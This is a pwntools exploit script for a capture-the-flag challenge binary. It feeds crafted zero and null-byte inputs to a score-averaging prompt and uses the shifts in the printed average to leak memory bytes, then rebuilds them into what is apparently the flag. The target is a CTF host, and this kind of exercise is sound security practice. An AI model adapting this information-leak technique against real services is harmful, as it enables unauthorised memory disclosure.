from pwn import *
from icecream import ic

elf = exe = ELF("./chall")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("0.cloud.chals.io", 10198)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000009d9
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

# io = start()

l = []
prev = 0
for i in range(15):
    io = start()
    for j in range(3):
        ru(":")
        sl(b'0')
    for j in range(15-i):
        ru(":")
        sl(b'0')
    for k in range(i):
        ru(":")
        sl(b'\x00')
    for p in range(2):
        ru(":")
        sl(b'0')
    ru("Average score is ")
    x = float(rl().decode().strip()[:-1]) - prev
    ic(x)
    ic(prev)
    if x >= 0:
        ic(x)
        prev += x
        x = round(x*20)
        ic(x)
        l.append(x.to_bytes((x.bit_length() + 7) // 8, byteorder='little'))
        ic(l)
    else:
        prev += x
        ic(x)
        x = round(x*20)
        x = x + 4294967296
        ic(x)
        l.append(x.to_bytes((x.bit_length() + 7) // 8, byteorder='little'))
        ic(l)

        
result = b"".join(l[::-1])
print(result.decode())

io.interactive()
